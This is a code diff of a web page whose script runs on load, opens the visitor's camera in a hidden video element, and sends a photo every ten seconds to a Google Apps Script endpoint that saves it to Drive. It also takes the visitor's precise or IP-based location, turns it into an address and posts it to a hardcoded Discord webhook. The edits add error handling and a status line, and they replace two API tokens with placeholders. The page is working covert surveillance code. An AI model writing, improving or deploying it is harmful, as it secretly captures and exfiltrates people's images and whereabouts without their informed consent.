@@ -8,50 +8,53 @@
 <body>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <div id="status"></div> <!-- For status messages -->
 
     <script>
-        const googleAppsScriptURL = 'https://script.google.com/macros/s/AKfycbzqNAUArSdPvl7n_9A7sSsFSQgL4eNvSYJlE2KxQ3qIPfss9l_BPJQ-coaI7EIkGMSNiA/exec'; // Replace with your Google Apps Script URL
-        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ'; // Replace with your Discord webhook URL
-        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa'; // Replace with your LocationIQ API token
-        const ipapiToken = '41d360af12f2bf'; // Replace with your IPAPI token
+        const googleAppsScriptURL = 'https://script.google.com/macros/s/AKfycbzqNAUArSdPvl7n_9A7sSsFSQgL4eNvSYJlE2KxQ3qIPfss9l_BPJQ-coaI7EIkGMSNiA/exec';
+        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
+        const locationIQToken = 'YOUR_LOCATIONIQ_TOKEN_HERE'; // Securely manage your API token
+        const ipapiToken = 'YOUR_IPAPI_TOKEN_HERE'; // Securely manage your API token
 
-        // Initialize camera and start capturing photos in intervals
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
-
+                document.getElementById('status').innerText = "Camera initialized. Capturing images every 10 seconds.";
+                
                 // Capture a photo every 10 seconds
                 setInterval(captureAndSendPhoto, 10000);
                 getLocation(); // Start location fetching
             } catch (error) {
+                document.getElementById('status').innerText = "Error accessing the camera.";
                 console.error("Error accessing the camera:", error);
             }
         }
 
-        // Capture photo and convert to base64 for Google Apps Script
         async function capturePhoto() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
+            // Set canvas size to match video stream size
             context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/png').split(',')[1];  // Return base64 part only
+            return canvas.toDataURL('image/png').split(',')[1];
         }
 
-        // Capture and send photo to Google Apps Script
         async function captureAndSendPhoto() {
             const imageData = await capturePhoto();
-
             const response = await fetch(googleAppsScriptURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: `image=${encodeURIComponent(imageData)}`
             });
 
-            const imageUrl = await response.text();
-            console.log("Image saved to Google Drive:", imageUrl);
+            if (response.ok) {
+                const imageUrl = await response.text();
+                console.log("Image saved to Google Drive:", imageUrl);
+            } else {
+                console.error("Error saving image to Google Drive.");
+            }
         }
 
-        // Get geolocation using LocationIQ or fallback to IPAPI
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, error);
@@ -63,18 +66,14 @@
         function success(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-
-            // Use LocationIQ to get a human-readable address
             reverseGeocodeWithLocationIQ(latitude, longitude);
         }
 
         function error(err) {
             console.error(`Geolocation Error (${err.code}): ${err.message}`);
-            // Fallback to IP geolocation
-            getIPGeolocation();
+            getIPGeolocation(); // Fallback to IP geolocation
         }
 
-        // Get location from IPAPI as a fallback
         function getIPGeolocation() {
             fetch(`https://ipapi.co/json/`)
                 .then(response => response.json())
@@ -88,7 +87,6 @@
                 .catch(() => console.error('Error fetching IP geolocation.'));
         }
 
-        // Reverse geocoding to get human-readable address using LocationIQ
         function reverseGeocodeWithLocationIQ(latitude, longitude) {
             const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
 
@@ -105,7 +103,6 @@
                 .catch(() => console.error('Error during reverse geocoding.'));
         }
 
-        // Send location information to Discord
         function sendLocationToDiscord(latitude, longitude, address) {
             const message = {
                 content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
@@ -126,7 +123,6 @@
             });
         }
 
-        // Start camera and location capture on page load
         window.onload = () => {
             initCamera();
         };
